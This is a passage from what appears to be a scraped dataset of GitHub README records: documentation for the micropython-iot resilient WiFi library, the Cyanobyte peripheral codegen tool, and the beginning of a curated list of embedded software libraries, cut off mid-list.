and offers guaranteed message delivery.\nmicropython iot application design\ncontents\ndesign\n2.1 protocol\nfiles and packages\n3.1 installation\n3.1.1 existing users\n3.1.2 firmware and dependency\n3.1.3 preconditions for demos\n3.2 usage\n3.2.1 the main demo\n3.2.2 the remote control demo\n3.2.3 quality of service demo\n3.2.4 the fast qos demo\n3.2.5 troubleshooting the demos\nclient side applications\n4.1 the client class\n4.1.1 initial behaviour\n4.1.2 watchdog timer\nserver side applications\n5.1 the server module\nensuring resilience guidelines for application design.\nquality of service guaranteeing message delivery.\n7.1 the qos argument\n7.2 the wait argument concurrent writes of qos messages.\nperformance\n8.1 latency and throughput\n8.2 client ram utilisation\n8.3 platform reliability\nextension to the pyboard\nhow it works\n10.1 interface and client module\n10.2 server module\n2. design\nthe code is asynchronous and based on asyncio. client applications on the remote import client.py which provides the interface to the link. the server side application uses server.py.\nmessages are required to be complete lines of text. they typically comprise an arbitrary python object encoded using json. the newline character ('\\n') is not allowed within a message but is optional as the final character.\nguaranteed message delivery is supported. this is described in section 7. performance limitations are discussed in section 8.\n2.1 protocol\nclient and server applications use readline and write methods to communicate: in the case of an outage of wifi or the connected endpoint, the method will pause until the outage ends. while the system is tolerant of runtime server and wifi outages, this does not apply on initialisation. the server must accessible before clients are started.\nthe link status is determined by periodic exchanges of keepalive messages. this is transparent to the application. if a keepalive is not received within a user specified timeout an outage is declared. on the client the wifi is disconnected and a reconnection procedure is initiated. on the server the connection is closed and it awaits a new connection.\neach client has a unique id which is an arbitrary string. in the demo programs this is stored in local.py. the id enables the server application to determine which physical client is associated with an incoming connection.\ncontents\n3. files and packages\nthis repo has been updated for uasyncio v3. this is incorporated in daily builds of firmware and will be available in release builds later than v1.12. server code may be run under cpython v3.8 or above. it may be run under micropython (unix build), but at the time of writing this requires this fix to incorporate uasyncio.\ndirectory iot:\nclient.py / client.mpy client module. the esp8266 has insufficient ram to compile client.py so the precompiled client.mpy should be used. see note below.\nserver.py server module. (runs under cpython 3.5+ or micropython 1.10+). directory iot/primitives:\n__init__.py functions common to client and server.\nswitch.py debounced switch interface. used by remote demo. optional directories containing python packages:\niot/examples a simple example. up to four clients communicate with a single server instance.\niot/remote demo uses the library to enable one client to control another. this may need adapting for your hardware.\niot/qos demonstrates and tests the qos (quality of service) feature, see quality of service.\niot/pb1 contians packages enabling a pyboard v1.x to communicate with the server via an esp8266 connected by i2c. see documentation.\nnote: the file client.mpy works with daily builds at the time of writing. the bytecode format changes occasionally. if an application throws a bytecode error it is necessary to cross-compile client.py with the associated version of mpy-cross. or raise an issue and i will post an update.\n3.1 installation\nthis section describes the installation of the library and the demos. the esp8266 has limited ram: there are specific recommendations for installation on that platform.\n3.1.1 existing users\nit is recommended to remove the old version and re-install as below.\nthere have been api changes to accommodate the new uasyncio version: the event loop argument is no longer required or accepted in client and server constructors. the directory structure has changed, requiring minor changes to import statements.\n3.1.2 firmware and dependency\non esp8266, ram can be saved by building firmware from source, freezing client.py as bytecode. if this is not done, it is necessary to cross compile client.py. the file client.mpy is provided for those unable to do this. if freezing, create an iot directory in your modules directory and copy iot/client.py and the directory iot/primitives and contents there.\npre-requisites: firmware must be a current daily build or a release build after v1.12. if upgrading, particularly on an esp8266, it is wise to erase flash prior to installtion. in particular this will ensure the use of littlefs with its associated ram saving.\nthis repository is a python package, consequently on the client the directory structure must be retained. the following installs all demos on the target.\non your pc move to a directory of your choice and clone the repository there:\ngit clone https://github.com/peterhinch/micropython-iot\ninstallation consists of copying the iot directory and contents to an iot directory on the boot device. on esp8266 or esp32 the boot device is/pyboard. on the pyboard d it will be /flash or /sd depending on whether an sd card is fitted.\ncopying may be done using any -----> tool !!!  but i recommend rshell. if this is used start in the directory on your pc containing the clone, start rshell and issue (adapting the boot device for your platform):\nrsync iot /pyboard/iot\non esp8266, unless frozen, it is necessary to delete client.py to force the use of client.mpy:\nrm /pyboard/iot/client.py\n3.1.3 preconditions for demos\nthe demo programs store client configuration data in a file local.py. each demo has its own local.py located in the directory of the demo code. this contains the following constants which should be edited to match local conditions. remove the use_my_local hack designed for my wifi privacy.:\nmy_id = '1' # client-unique string.\nserver = '192.168.0.10' # server ip address.\nssid = 'use_my_local' # insert your wifi credentials\npw = 'password'\nport = 8123\ntimeout = 2000\n# the following may be deleted\nif ssid == 'use_my_local':\nfrom iot.examples.my_local import *\nthe esp8266 can store wifi credentials in flash memory. if desired, esp8266 clients can be initialised to connect to the local network prior to running the demos. in this case the ssid and pw variables may optionally be empty strings (ssid = '').\nnote that the server-side examples below specify python3 in the run command. in every case micropython may be substituted to run under the unix build of micropython.\n3.2 usage\n3.2.1 the main demo\nthis illustrates up to four clients communicating with the server. the demo expects the clients to have id's in the range 1 to 4: if using multiple clients edit each one's local.py accordingly.\non the server navigate to the parent directory of iot and run:\npython3 -m iot.examples.s_app_cp\nor\nmicropython -m iot.examples.s_app_cp\non each client run:\nimport iot.examples.c_app\n3.2.2 the remote control demo\nthis shows one esp8266 controlling another. the transmitter should have a pushbutton between gpio 0 and gnd, both should have an led on gpio 2.\non the server navigate to the parent directory of iot and run:\npython3 -m iot.remote.s_comms_cp\nor\nmicropython -m iot.remote.s_comms_cp\non the esp8266 run (on transmitter and receiver respectively):\nimport iot.remote.c_comms_tx\nimport iot.remote.c_comms_rx\n3.2.3 quality of service demo\nthis test program verifies that each message (in each direction) is received exactly once. on the server navigate to the parent directory of iot and run:\npython3 -m iot.qos.s_qos_cp\nor\nmicropython -m iot.qos.s_qos_cp\non the client, after editing /pyboard/qos/local.py, run:\nimport iot.qos.c_qos\n3.2.4 the fast qos demo\nthis tests the option of concurrent qos writes. this is an advanced feature discussed in section 7.1. to run the demo, on the server navigate to the parent directory of iot and run:\npython3 -m iot.qos.s_qos_fast\nor\nmicropython -m iot.qos.s_qos_fast\non the client, after editing /pyboard/qos/local.py, run:\nimport iot.qos.c_qos_fast\n3.2.5 troubleshooting the demos\nif local.py specifies an ssid, on startup the demo programs will pause indefinitely if unable to connect to the wifi. if ssid is an empty string the assumption is an esp8266 with stored credentials; if this fails to connect an oserror will be thrown. an oserror will also be thrown if initial connectivity with the server cannot be established.\ncontents\n4. client side applications\na client-side application instantiates a client and launches a coroutine which awaits it. after the pause the client has connected to the server and communication can begin. this is done using client.write and client.readline methods.\nevery client ha a unique id (my_id) typically stored in local.py. the id comprises a string subject to the same constraint as messages:\nmessages comprise a single line of text; if the line is not terminated with a newline ('\\n') the client library will append it. newlines are only allowed as the last character. blank lines will be ignored.\na basic client-side application has this form:\nimport uasyncio as asyncio\nimport ujson\nfrom iot import client\nimport local # or however you configure your project\nclass app:\ndef __init__(self, verbose):\nself.cl = client.client(local.my_id, local.server,\nlocal.port, local.ssid, local.pw,\nlocal.timeout, conn_cb=self.state,\nverbose=verbose)\nasyncio.create_task(self.start())\nasync def start(self):\nawait self.cl # wait until client has connected to server\nasyncio.create_task(self.reader())\nawait self.writer() # wait forever\ndef state(self, state): # callback for change in connection status\nprint(\"connection state:\", state)\nasync def reader(self):\nwhile true:\nline = await self.cl.readline() # wait until data received\ndata = ujson.loads(line)\nprint('got', data, 'from server app')\nasync def writer(self):\ndata = [0, 0]\ncount = 0\nwhile true:\ndata[0] = count\ncount += 1\nprint('sent', data, 'to server app\\n')\nawait self.cl.write(ujson.dumps(data))\nawait asyncio.sleep(5)\ndef close(self):\nself.cl.close()\napp = none\nasync def main():\nglobal app # for closure by finally clause\napp = app(true)\nawait app.start() # wait forever\ntry:\nasyncio.run(main())\nfinally:\napp.close() # ensure proper shutdown e.g. on ctrl-c\nasyncio.new_event_loop()\nif an outage of server or wifi occurs, the write and readline methods will pause until connectivity has been restored. the server side api is similar.\ncontents\n4.1 the client class\nthe constructor has a substantial number of configuration options but in many cases defaults may be accepted for all but the first five.\nconstructor args:\nmy_id the client id.\nserver the server ip-adress to connect to.\nport=8123 the port the server listens on.\nssid='' wifi ssid. may be blank for esp82666 with credentials in flash.\npw='' wifi password.\ntimeout=2000 connection timeout in ms. if a connection is unresponsive for longer than this period an outage is assumed.\nconn_cb=none callback or coroutine that is called whenever the connection changes.\nconn_cb_args=none arguments that will be passed to the connected_cb callback. the callback will get these args preceeded by a bool indicating the new connection state.\nverbose=false provides optional debug output.\nled=none if a pin instance is passed it will be toggled each time a keepalive message is received. can provide a heartbeat led if connectivity is present. on pyboard d a pin or led instance may be passed.\nwdog=false if true a watchdog timer is created with a timeout of 20s. this will reboot the board if it crashes - the assumption is that the application will be restarted via main.py.\nmethods (asynchronous):\nreadline no args. pauses until data received. returns a line.\nwrite args: buf, qos=true, wait=true. buf holds a line of text.\nif qos is set, the system guarantees delivery. if it is clear messages may (rarely) be lost in the event of an outage.\nthe wait arg determines the behaviour when multiple concurrent writes are launched with qos set. see quality of service.\nthe following asynchronous methods are described in initial behaviour below. in most cases they can be ignored. 3. bad_wifi 4. bad_server\nmethods (synchronous):\nstatus returns true if connectivity is present. may also be read using function call syntax (via __call__).\nclose closes the socket. should be called in the event of an exception such as a ctrl-c interrupt. also cancels the wdt in the case of a software wdt.\nbound variable:\nconnects the number of times the client instance has connected to wifi. this is maintained for information only and provides some feedback on the reliability of the wifi radio link.\nthe client class is awaitable. if\nawait client_instance\nis issued, the coroutine will pause until connectivity is (re)established.\napplications which always await the write method do not need to check or await the client status: write will pause until it can complete. if write is launched using create_task it is essential to check status otherwise during an outage unlimited numbers of coroutines will be created.\nthe client buffers up to 20 incoming messages. to avoid excessive queue growth applications should have a single coroutine which spends most of its time awaiting incoming data.\ncontents\n4.1.1 initial behaviour\nwhen an application instantiates a client it attemps to connect to wifi and then to the server. initial connection is handled by the following client asynchronous bound methods (which may be modified by subclassing):\nbad_wifi no args.\nbad_server no args. awaited if server refuses an initial connection.\nnote that, once a server link has been initially established, these methods will not be called: reconnection after outages of wifi or server are automatic.\nthe bad_wifi coro attempts to connect using the wifi credentials passed to the constructor. this will pause until a connection has been achieved. the bad_server coro raises an oserror. behaviour of either of these may be modified by subclassing.\nplatforms other than esp8266 launch bad_wifi unconditionally on startup. in the case of an esp8266 which has wifi credentials stored in flash it will first attempt to connect using that data, only launching bad_wifi if this fails in a timeout period. this is to minimise flash wear.\n4.1.2 watchdog timer\nthis option provides a last-ditch protection mechanism to keep a client running in the event of a crash. the esp8266 can (rarely) crash, usually as a result of external electrical disturbance. the wdt detects that the client code is no longer running and issues a hard reset. note that this implies a loss of program state. it also assumes that main.py contains a line of code which will restart the application.\ndebugging code with a wdt can be difficult because bugs or software interrupts will trigger unexpected resets. it is recommended not to enable this option until the code is stable.\non the esp8266 the wdt uses a sofware timer: it can be cancelled which simplifies debugging. see examples/c_app.py for the use of the close method in a finally clause.\nthe wdt on the pyboard d is a hardware implementation: it cannot be cancelled. it may be necessary to use safe boot to bypass main.py to access the code.\ncontents\n5. server side applications\na typical example has an app class with one instance per physical client device. this enables instances to share data via class variables. each instance launches a coroutine which acquires a connection instance for its individual client (specified by its client_id). this process will pause until the client has connected with the server. communication is then done using the readline and write methods of the connection instance.\nmessages comprise a single line of text; if the line is not terminated with a newline (\\n) the server library will append it. newlines are only allowed as the last character. blank lines will be ignored.\na basic server-side application has this form:\nimport asyncio\nimport json\nfrom iot import server\nimport local # or however you want to configure your project\nclass app:\ndef __init__(self, client_id):\nself.client_id = client_id # this instance talks to this client\nself.conn = none # will be connection instance\nself.data = [0, 0, 0] # exchange a 3-list with remote\nasyncio.create_task(self.start())\nasync def start(self):\n# await connection from the specific ep8266 client\nself.conn = await server.client_conn(self.client_id)\nasyncio.create_task(self.reader())\nasyncio.create_task(self.writer())\nasync def reader(self):\nwhile true:\n# next line will pause for client to send a message. in event of an\n# outage it will pause for its duration.\nline = await self.conn.readline()\nself.data = json.loads(line)\nprint('got', self.data, 'from remote', self.client_id)\nasync def writer(self):\ncount = 0\nwhile true:\nself.data[0] = count\ncount += 1\nprint('sent', self.data, 'to remote', self.client_id, '\\n')\nawait self.conn.write(json.dumps(self.data)) # may pause in event of outage\nawait asyncio.sleep(5)\nasync def main():\nclients = {1, 2, 3, 4}\napps = [app(n) for n in clients] # accept 4 clients with id's 1-4\nawait server.run(clients, true, local.port, local.timeout) # verbose\ndef run():\ntry:\nasyncio.run(main())\nexcept keyboardinterrupt: # delete this if you want a traceback\nprint('interrupted')\nfinally:\nserver.connection.close_all()\nasyncio.new_event_loop()\nif __name__ == \"__main__\":\nrun()\n5.1 the server module\nserver-side applications should create and run a server.run task. this runs forever and takes the following args:\nexpected a set of expected client id strings.\nverbose=false if true output diagnostic messages.\nport=8123 tcp/ip port for connection. must match clients.\ntimeout=2000 timeout for outage detection in ms. must match the timeout of all client instances.\nthe expected arg causes the server to produce a warning message if an unexpected client connects, or if multiple clients have the same id (this will cause tears before bedtime).\nthe module is based on the connection class. a connection instance provides a communication channel to a specific client. the connection instance for a given client is a singleton and is acquired by issuing\nconn = await server.client_conn(client_id)\nthis will pause until connectivity has been established. it can be issued at any time: if the connection has already been instantiated, that instance will be returned. the connection constructor should not be called by applications.\nthe connection instance\nmethods (asynchronous):\nreadline no args. pauses until data received. returns a line.\nwrite args: buf, qos=true, wait=true. buf holds a line of text.\nif qos is set, the system guarantees delivery. if it is clear messages may (rarely) be lost in the event of an outage.__ the wait arg determines the behaviour when multiple concurrent writes are launched with qos set. see quality of service.\nmethods (synchronous):\nstatus returns true if connectivity is present. the connection state may also be retrieved using function call syntax (via .__call__).\n__getitem__ enables the connection of another client to be retrieved using list element access syntax. will throw a keyerror if the client is unknown (has never connected).\nclass method (synchronous):\nclose_all no args. closes all sockets: call on exception (e.g. ctrl-c).\nbound variable:\nnconns maintains a count of (re)connections for information or monitoring of outages.\nthe connection class is awaitable. if\nawait connection_instance\nis issued, the coroutine will pause until connectivity is (re)established.\napplications which always await the write method do not need to check or await the server status: write will pause until it can complete. if write is launched using create_task it is essential to check status otherwise during an outage unlimited numbers of coroutines will be created.\nthe server buffers incoming messages but it is good practice to have a coro which spends most of its time waiting for incoming data.\nserver module coroutines:\nrun args: expected verbose=false port=8123 timeout=2000 this is the main coro and starts the system. expected is a set containing the id's of all clients.\nverbose causes debug messages to be printed.\nport is the port to listen to.\ntimeout is the number of ms that can pass without a keepalive until the connection is considered dead.\nclient_conn arg: client_id. pauses until the sepcified client has connected. returns the connection instance for that client.\nwait_all args: client_id=none peers=none. see below.\nthe wait_all coroutine is intended for applications where clients communicate with each other. typical user code cannot proceed until a given set of clients have established initial connectivity.\nwait_all, where a client_id is specified, behaves as client_conn except that it pauses until further clients have also connected. if a client_id is passed it will returns that client's connection instance. if none is passed the assumption is that the current client is already connected and the coro returns none.\nthe peers argument defines which clients it must await: it must either be none or a set of client id's. if a set of client_id values is passed, it pauses until all clients in the set have connected. if none is passed, it pauses until all clients specified in run's expected set have connected.\nit is perhaps worth noting that the user application can impose a timeout on this by means of asyncio.wait_for.\ncontents\n6. ensuring resilience\nthere are two principal ways of provoking lmacrxblk errors and crashes.\nfailing to close sockets when connectivity is lost.\nfeeding excessive amounts of data to a socket after connectivity is lost: this causes an overflow to an internal esp8266 buffer.\nthese modules aim to address these issues transparently to application code, however it is possible to write applications which violate 2.\nthere is a global timeout value defined in local.py which should be the same for the server and all clients. each end of the link sends a keepalive (ka) packet (an empty line) at a rate guaranteed to ensure that at least one ka will be received in every timeout period. if it is not, connectivity is presumed lost and both ends of the interface adopt a recovery procedure.\nif an application always awaits a write with qos==true there is no risk of feeding excess data to a socket: this is because the coroutine does not return until the remote endpoint has acknowledged reception.\non the other hand if multiple messages are sent within a timeout period with qos==false there is a risk of buffer overflow in the event of an outage.\ncontents\n7. quality of service\nin the presence of a stable wifi link tcp/ip should ensure that packets sent are received intact. in the course of extensive testing with the esp8266 we found that (very rarely) packets were lost. it is not known whether this behavior is specific to the esp8266. another mechanism for message loss is the case where a message is sent in the interval between an outage occurring and it being detected. this is likely to occur on all platforms.\nthe client and server modules avoid message loss by the use of acknowledge packets: if a message is not acknowledged within a timeout period it is retransmitted. this implies duplication where the acknowledge packet is lost. receive message de-duplication is employed to provide a guarantee that the message will be delivered exactly once. while delivery is guaranteed, timeliness is not. messages are inevitably delayed for the duration of a wifi or server outage where the write coroutine will pause for the duration.\nguaranteed delivery involves a tradeoff against throughput and latency. this is managed by optional arguments to .write, namely qos=true and wait=true.\n7.1 the qos argument\nmessage integrity is determined by the qos argument. if false message delivery is not guaranteed. a use-case for disabling qos is in applications such as remote control. if the user presses a button and nothing happens they would simply repeat the action. such messages are always sent immediately: the application should limit the rate at which they can be sent, particularly on esp8266 clients, to avoid risk of buffer overflow.\nwith qos set, the message will be delivered exactly once.\nwhere successive qos messages are sent there may be a latency issue. by default the transmission of a qos message will be delayed until reception of its predecessor's acknowledge. consequently the write coroutine will pause, introducing latency. this serves two purposes. firstly it ensures that messages are received in the order in which they were sent (see below).\nsecondly consider the case where an outage has occurred but has not yet been detected. the first message is written, but no acknowledge is received. subsequent messages are delayed, precluding the risk of esp8266 buffer overflows. the interface resumes operation after the outage has cleared.\n7.2 the wait argument\nthis default can be changed with the wait argument to write. if false a qos message will be sent immediately, even if acknowledge packets from previous messages are pending. applications should be designed to limit the number of such qos messages sent in quick succession: on esp8266 clients buffer overflows can occur.\nin testing in 2019 the esp32 was not resilient under these circumstances; this appears to have been fixed in current firmware builds. nevertheless setting wait=false potentially risks resilience. if used, applications should be tested to verify quality of service in the presence of wifi outages.\nif messages are sent with wait=false there is a chance that they may not be received in the order in which they were sent. as described above, in the event of qos message loss, retransmission occurs after a timeout period has elapsed. during that timeout period the application may have successfully sent another non-waiting qos message resulting in out of order reception.\nthe demo programs qos/c_qos_fast.py (client) and qos/s_qos_fast.py issue four write operations with wait=false in quick succession. this number is probably near the maximum on an esp8266. note the need explicitly to check for connectivity before issuing the write: this is to avoid spawning large numbers of coroutines during an outage.\nin summary specifying wait=false should be considered an \"advanced\" option requiring testing to prove that resilence is maintained.\ncontents\n8. performance\n8.1 latency and throughput\nthe interface is intended to provide low latency: if a switch on one node controls a pin on another, a reasonably quick response can be expected. the link is not designed for high throughput because of the buffer overflow issue discussed in section 6. this is essentially a limitation of the esp8266 device: more agressive use of the wait arg may be possible on platforms such as the pyboard d.\nin practice latency on the order of 100-200ms is normal; if an outage occurs latency will inevitably persist for the duration.\ntimeout\nthis defaults to 2s. on client it is a constructor argument, on the server it is an arg to server.run. its value should be common to all clients and the sever. it determines the time taken to detect an outage and the frequency of keepalive packets. this time was chosen on the basis of measured latency periods on wifi networks. it may be increased at the expense of slower outage detection. reducing it may result in spurious timeouts with unnecessary wifi reconnections.\n8.2 client ram utilisation\non esp8266 with a current (june 2020) daily build the demo reports over 20kb free. free ram of 25.9kb was achieved with compiled firmware with frozen bytecode as per installation.\n8.3 platform reliability\nin extensive testing the pyboard d performed impeccably: no failures of any kind were observed in weeks of testing through over 1000 outages.\nesp32 was prone to occasional spontaneous reboots. it would typically run for a few days through multiple wifi outages before rebooting.\nesp8266 still occasionally crashes and it is recommended to use the watchdog feature to reboot it should this occur.\nit would take a very long time to achieve more than a subjective impression of the effectof usage options on failure rate. the precautionary principle suggests maximising free ram with frozen bytecode on esp8266 and avoiding concurrent qos==1 writes on espx platforms.\ncontents\n9. extension to the pyboard\nthis extends the resilient link to micropython targets lacking a network interface; for example the pyboard v1.x. connectivity is provided by an esp8266 running a fixed firmware build: this needs no user code.\nthe interface between the pyboard and the esp8266 uses i2c and is based on the existing i2c module.\nresilient behaviour includes automatic recovery from wifi and server outages; also from esp8266 crashes.\nsee documentation.\n10. how it works\n10.1 interface and client module\nthe client module was designed on the expectation that client applications will usually be simple: acquiring data from sensors and periodically sending it to the server and/or receiving data from the server and using it to control devices. developers of such applications probably don't need to be concerned with the operation of the module.\nthere are ways in which applications can interfere with the interface's operation either by blocking or by attempting to operate at excessive data rates. such designs can produce an erroneous appearance of poor wifi connectivity.\noutages are detected by a timeout of the receive tasks at either end. each peer sends periodic keepalive messages consisting of a single newline character, and each peer has a continuously running read task. if no message is received in the timeout period (2s by default) an outage is declared.\nfrom the client's perspective an outage may be of the wifi or the server. in practice wifi outages are more common: server outages on a lan are typically caused by the developer testing new code. the client assumes a wifi outage. it disconnects from the network for long enough to ensure that the server detects the outage. it then attempts repeatedly to reconnect. when it does so, it checks that the connection is stable for a period (it might be near the limit of wifi range).\nif this condition is met it attempts to reconnect to the server. if this succeeds the client runs. its status becomes true when it first receives data from the server.\na client or server side application which blocks or hogs processor time can prevent the timely transmission of keepalive messages. this will cause the server to declare an outage: the consequence is a sequence of disconnect and reconnect events even in the presence of a strong wifi signal.\n10.2 server module\nserver-side applications communicate via a connection instance. this is unique to a client. it is instantiated when a specified client first connects and exists forever. during an outage its status becomes false for the duration. the connection instance is retrieved as follows, with the client_conn method pausing until initial connectivity has been achieved:\nimport server\n# class details omitted\nself.conn = await server.client_conn(self.client_id)\neach client must have a unique id. when the server detects an incoming connection on the port it reads the client id from the client. if a connection instance exists for that id its status is updated, otherwise a connection is instantiated.\nthe connection has a continuously running coroutine ._read which reads data from the client. if an outage occurs it calls the ._close method which closes the socket, setting the bound variable ._sock to none. this corresponds to a false status. the ._read method pauses until a new connection occurs. the aim here is to read data from esp8266 clients as soon as possible to minimise risk of buffer overflows.\nthe connection detects an outage by means of a timeout in the ._read method: if no data or keepalive is received in that period an outage is declared, the socket is closed, and the connection status becomes false.\nthe connection has a ._keepalive method. this regularly sends keepalive messages to the client. application code which blocks the scheduler can cause this not to be scheduled in a timely fashion with the result that the client declares an outage and disconnects. the consequence is a sequence of disconnect and reconnect events even in the presence of a strong wifi signal.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000686, "year": null}, {"Unnamed: 0": 690, "autor": 690, "date": null, "content": "Cyanobyte - Machine readable datasheets for documentation & codegen\nThis project is an example of how to describe peripherals with an intermediary layer (YAML files) which can be used to generate library files for a peripheral.\nIt can also generate reference documentation for a peripheral, useful for embedding into datasheets.\nThe tool works well for I2C devices, while SPI support is in progress.\nThis is not an official Google product.\nSetup\nNote: This project requires Python3. You can install using pip\npip install cyanobyte\nRun Codegen\ncyanobyte-codegen -t templates/doc.md -o ./build peripherals/MCP4725.yaml\nOptions\n-t - A template file. You can provide multiple template files.\n-o - The output directory where files will be generated.\n-e - The directory that emboss folder is stored.\n-d - Debug flag to print out additional information.\n-c - Clean the output directory before generating files.\nOne or multiple files can be passed as an argument.\nClean\nrm -rf ./build\nRun Validator\ncyanobyte-validator peripherals/MCP9808.yaml\nOne or multiple files can be passed as an argument.\nPeripheral YAML file\nThe current spec is described in docs/cyanobyte.md. You can find all examples in the peripherals/ directory.\nTest\nLint\npython3 -m pylint --rcfile=test/pylintrc cyanobyte/*.py\npython3 -m pylint --rcfile=test/pylintrc test/sampleData/*.py\nUnit test\npython3 -m unittest test.test_codegen\nTemplates\nThe templates directory includes a set of canonical templates which can be used with this codegen tool.\nThe peripherals directory includes a set of peripheral description files that have been created along with the project. It is not an exhaustive list.\nDevelopment setup\npip install -r requirements.txt --user\nFor more advanced development, also install the dev list. pip install -r requirements-dev.txt --user\nProjects using Cyanobyte\nFile an issue or pull request to add your project to the list.\nContributors\nContributions are welcome! See CONTRIBUTING.md for more information.\nWhen a pull request is submitted, a continuous integration task is run. The CI task must be completed successfully before a patch is merged. You can see the specific rules run in cloudbuild.yaml.\nLicense\nSee LICENSE", "link": "https://github.com/google/cyanobyte", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "cyanobyte - machine readable datasheets for documentation & codegen\nthis project is an example of how to describe peripherals with an intermediary layer (yaml files) which can be used to generate library files for a peripheral.\nit can also generate reference documentation for a peripheral, useful for embedding into datasheets.\nthe -----> tool !!!  works well for i2c devices, while spi support is in progress.\nthis is not an official google product.\nsetup\nnote: this project requires python3. you can install using pip\npip install cyanobyte\nrun codegen\ncyanobyte-codegen -t templates/doc.md -o ./build peripherals/mcp4725.yaml\noptions\n-t - a template file. you can provide multiple template files.\n-o - the output directory where files will be generated.\n-e - the directory that emboss folder is stored.\n-d - debug flag to print out additional information.\n-c - clean the output directory before generating files.\none or multiple files can be passed as an argument.\nclean\nrm -rf ./build\nrun validator\ncyanobyte-validator peripherals/mcp9808.yaml\none or multiple files can be passed as an argument.\nperipheral yaml file\nthe current spec is described in docs/cyanobyte.md. you can find all examples in the peripherals/ directory.\ntest\nlint\npython3 -m pylint --rcfile=test/pylintrc cyanobyte/*.py\npython3 -m pylint --rcfile=test/pylintrc test/sampledata/*.py\nunit test\npython3 -m unittest test.test_codegen\ntemplates\nthe templates directory includes a set of canonical templates which can be used with this codegen tool.\nthe peripherals directory includes a set of peripheral description files that have been created along with the project. it is not an exhaustive list.\ndevelopment setup\npip install -r requirements.txt --user\nfor more advanced development, also install the dev list. pip install -r requirements-dev.txt --user\nprojects using cyanobyte\nfile an issue or pull request to add your project to the list.\ncontributors\ncontributions are welcome! see contributing.md for more information.\nwhen a pull request is submitted, a continuous integration task is run. the ci task must be completed successfully before a patch is merged. you can see the specific rules run in cloudbuild.yaml.\nlicense\nsee license", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000690, "year": null}, {"Unnamed: 0": 691, "autor": 691, "date": null, "content": "\ud83d\udea7 A curated list of awesome sources and libs for Embedded Systems\nThere is my attempt to create list of software for Embedded Systems\nURL: https://github.com/iDoka/awesome-embedded-software\nContents\nUnder construct\nCommon\nembxx - Embedded C++ Library\nembedded-libs - Libraries for embedded software (mainly for STM32)\nRegExp - Regular expressions library for embedded systems\nETLCPP - Embedded Template Library where the user can declare the size, or maximum size of any object upfront\neFLL - Embedded Fuzzy Logic Library is a standard library for Embedded Systems\nProtocol Parsers\nLwGPS - Lightweight GPS NMEA parser for embedded systems\nLwESP - lightweight ESP AT commands parser library to communicate with ESP8266 or ESP32 Wi-Fi module using AT commands\nLwGSM - Library for SIMCOM GSM modules to communicate with AT commands and RTOS from host device\nGSM_Engine - Generic AT parser for AT command based modules\nTinyGSM - small Arduino library for GSM modules, that just works\nAT command parser\natat - Lib for AT-like custom commands processing\ncAT - Plain C library for parsing AT commands for use in host devices\ngzat - Portable AT command parsing library in C++ language\nATParser - An mbed-os compatible AT command parser\natcommander - Portable C++ library for sending AT commands and parsing their responses\nVarious protocols\nlwpkt - Lightweight packet protocol structure for multi-device communication focused on RS-485\nlwow - Lightweight onewire protocol library optimized for UART hardware on embedded systems\npanStamp-SWAP - Simple Wireless Abstract Protocol for any existing ISM radio\nMemory\nlibmemory - memory management library with implementations for malloc(), free(), and other useful memory management functions\nlwmem - Lightweight dynamic memory manager library for embedded systems with memory constraints. It implements malloc, calloc, realloc and free functions\nEasyFlash - lightweight embedded flash memory library\nLogging\nembedded-log - a small and beautiful embedded log library for mcu\nEasyLogger - An ultra-lightweight (ROM<1.6K, RAM<0.3k), high-performance C/C++ log library\nData Bases\nFlashDB - ultra-lightweight database that supports key-value and time series data\nRing Buffer\nLwRB - Lightweight generic ring buffer manager library\nRingBuffer - Simple Interrupt Safe Ring (Circular) Buffer Queuing Library for Embedded platforms\nprintf\nlwprintf - Lightweight printf library optimized for embedded systems\nEmbedded_Printf - Embedded version of the famous \"printf( )\" function. The idea is create an simple and efficient library to meet some common needs in embedded systems\ntinyprintf - tiny printf and sprintf library for small embedded systems\nCLI\ncli - a CLI (Command Line Interface) example build in pure C. Designed for MCU, support block/non-block mode input\nterminal - a Command Line Interface for microcontrollers. Flexible terminal settings allow you to integrate it with any microcontroller, without much effort\nSerialMenu - Arduino library to easily create menus on the serial console\n-\n-\n-\n-\n-\nMenu\nProMenu - Advanced Generic Application Menu Library. ProMenu Library is used for fast implementing advanced user menus. It supports nesting, numeric settings, text settings, boolean values and events. Library is implemented in C++ with build-in Arduino port, but it is easy to port to different architecture.\n-\n-\n-\nThread management\nC-Thread-Pool - minimal but powerful thread pool in ANSI C\nIO\nFastIO - Fast GPIO forked from http://os.mbed.com/users/Sissors/code/FastIO/\n-\n-\n-\nBuffers\nEmbeddedProto - a C++ Protocol Buffers implementation specifically suitable for ARM Cortex-M microcontrollers. It is small, reliable and easy to use\nprotobuf-embedded-c - a protocol buffers generator for resource constrained embedded applications written in the C programming language\nSnippets\nCollection of miscellaneous portable C snippets\nHW\nembedded-driver - Embedded driver library for various peripheral\ntinyusb - cross-platform USB stack for embedded system\nFlashAlgo - Framework for building Arm Cortex-M \"FLM\" style flash programming algorithms\nProtocols\nxmodem - XMODEM Library for embedded, mobile, iot, and desktop systems\nmicrorl - micro read line library for small and embedded devices with basic VT100 support\nTinyFrame - a simple library for building and parsing data frames for serial interfaces (like UART / RS232)\ninterchange - request/response mechanism for embedded development, using atomics\n-\n-\nRF\nRadioHead - Packet Radio library for embedded microprocessors\nAdafruit's RadioHead - Packet Radio library for embedded microprocessors with docs\n-\nMQTT\nlibemqtt 1 - Embedded C client library for the MQTT protocol\nlibumqtt 2 - a Lightweight and fully asynchronous MQTT client C library based on libev\nPaho MQTT - C client library for embedded systems\n-\n-\nData processing\nliquid-fpm - Software-Defined Radio Fixed-Point Math Library for embedded signal processing\nliquid-dsp - digital signal processing library for software-defined radios\nminfft - small and fast Discrete Fourier Transform library\nRandom Number Generation\npcg-c-basic - code provides a minimal implementation of one member of the PCG family of random number generators, which are fast, statistically excellent, and offer a number of useful features\npcg-c - code provides an implementation of the PCG family of random number generators, which are fast, statistically excellent, and offer a number of useful features\nCryptography\ntrussed - a minimal, modular way to write cryptographic applications on microcontroller platforms (Rust)\nwolfSSH - a lightweight SSHv2 client and server library written in ANSI C and targeted for embedded, RTOS, and resource-constrained environments - primarily because of its small size, speed, and feature set\nLibHydrogen - a lightweight, secure, easy-to-use crypto library suitable for constrained environments\nkrypton - 